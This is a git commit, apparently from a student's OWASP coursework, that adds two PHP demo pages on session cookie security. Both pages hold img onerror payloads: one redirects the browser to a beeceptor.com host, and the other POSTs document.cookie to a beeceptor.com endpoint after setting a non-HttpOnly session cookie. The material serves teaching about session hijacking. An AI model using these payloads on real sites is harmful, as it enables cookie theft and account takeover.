eaab58ac93b3224435d07fefcdc17f98c3047ba1
AlexNicaise <alexandre.nicaise@etu.univ-cotedazur.fr>
2021-10-14 20:00:46 +0200

    Session same site & session secur

---
+++ session/same_site_cookie_vuln.php
@@ -0,0 +1,17 @@
+<?php
+  session_start();
+  header("Access-Control-Allow-Origin: *");
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Owasp</title>
+</head>
+<body>
+<img src=null onerror="window.location='https://secourity.free.beeceptor.com'" >
+</div>
+
+</body>
+</html>
+</style>
---
+++ session/session_secur.php
@@ -0,0 +1,19 @@
+<?php
+    $sess_name = session_name();
+    if (session_start()) {
+        setcookie($sess_name, session_id(), true, '/', null, null, false);
+    }
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Owasp</title>
+</head>
+<body>
+<img src=null onerror="fetch('https://security.free.beeceptor.com/', { method: 'POST', body: document.cookie})" >
+</div>
+
+</body>
+</html>
+</style>
